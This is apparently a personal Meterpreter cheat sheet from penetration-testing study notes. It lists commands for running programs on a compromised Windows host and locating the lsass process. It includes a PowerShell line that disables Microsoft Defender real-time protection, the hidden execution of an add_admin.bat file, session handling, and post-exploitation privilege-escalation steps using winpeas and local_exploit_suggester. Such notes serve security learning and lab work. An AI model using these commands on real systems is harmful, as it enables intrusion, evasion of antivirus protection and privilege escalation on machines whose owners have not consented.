---
tags:
  - "#msf"
  - "#meterpreter"
---


METERPRETER CHEAT SHEET

- for help specific to a command, type `help <command>` like `help execute` seen below
- execute cmd with argument and return output:
	- execute -i -H -f cmd -a "/c hostname"
	- execute -i -H -f wmic -a "bios get version"
	- execute -i -H -f nslookup
	- execute -i -H -f whoami

- use 'pgrep' to search for process by name, returns PID
	- pgrep lsass

![[Pasted image 20231202143545.png]]

- Disable MS Defender Real Time Protection using powershell command after dropping into cmd shell
	- powershell.exe "Set-MpPreference -DisableRealtimeMonitoring $true"

- execute a file in the current working directory (hide cmd window)
	- execute -H -f add_admin.bat

- background a session just by typing `background`
	- resume that session with `session -i <session_number>` > `session -i 1`
	- check open sessions with `sessions`
	- ![[Pasted image 20231202144404.png]]
### Post Exploitation
- run winpeas to enumerate device and check for openings
- run local_exploit_suggester to check for possible local exploits to run for priv esc
	- `run post/multi/recon/local_exploit_suggester`
	- you then back out to msf and then load the post exploit module and set SESSION option to whatever your session number is. It will perform the exploit against that session
- any other meterpreter modules can be loaded this way